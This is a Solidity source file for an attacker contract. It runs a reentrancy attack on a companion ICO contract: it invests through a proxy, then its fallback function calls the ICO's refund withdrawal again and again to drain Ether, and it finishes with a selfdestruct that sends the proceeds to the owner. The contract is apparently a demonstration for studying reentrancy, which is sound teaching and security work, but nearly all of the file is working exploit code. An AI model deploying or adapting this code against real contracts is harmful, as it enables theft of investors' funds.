pragma solidity ^0.4.18;

import "./ICO_Reentrancy.sol";

contract Proxy_Buyer_Reentrancy {

	address public owner;
	
	ICO_Reentrancy ico;
	
	modifier onlyOwner() {
        if (msg.sender != owner) {
            revert();
        }
        _;
    }
	
	function Proxy_Buyer_Reentrancy(address _ico_Reentrancy) public {
        owner = msg.sender;
		ico = ICO_Reentrancy(_ico_Reentrancy);
	}

	// Called when someone sends Ether directly to the Proxy address
	
    function () public payable {
		if (ico.balance > msg.value)	// If there isn't enough Ether in the ICO contract, don't callback, or it will give an error and revert
		{
			ico.call(bytes4(keccak256("withdrawIfFailed()")));		// Use .call() so it doesn't revert if it throws
		}
    }
	
	// First, invest in the ICO
	function Invest() public payable onlyOwner() {
		ico.call.value(msg.value)();	// We do NOT call DelegateTokensTo, because the receipt needs to be linked to the Proxy contract in order to withraw!
	}
	
	// After the ICO has ended, and if it has failed, call this function with a lot of gas to allow () being called back
	function Reentrancy() public onlyOwner() {
		ico.withdrawIfFailed();
	}

	// The call is necessary to complete the attack.
	function destruct() public onlyOwner() {
		selfdestruct(owner);
	}
}
